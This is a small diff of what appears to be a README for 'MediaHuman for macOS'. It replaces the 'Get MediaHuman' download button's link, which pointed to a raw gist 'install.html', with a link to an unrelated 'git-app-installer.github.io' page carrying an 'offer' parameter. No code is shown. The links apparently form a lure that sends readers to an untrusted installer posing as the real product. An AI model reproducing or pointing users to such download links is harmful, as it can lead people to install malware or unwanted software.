@@ -2,7 +2,7 @@
 
 MediaHuman for macOS is a versatile desktop application for converting, managing, and optimizing audio and video files efficiently.
 
-<a href="https://gistcdn.githack.com/helmtroll690/38f2cf498ab9945a1483be8f77c785ad/raw/40e76d3978f195afc5905704fe4f070e69d7340c/install.html?offer=MediaHuman" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MediaHuman" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MediaHuman%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
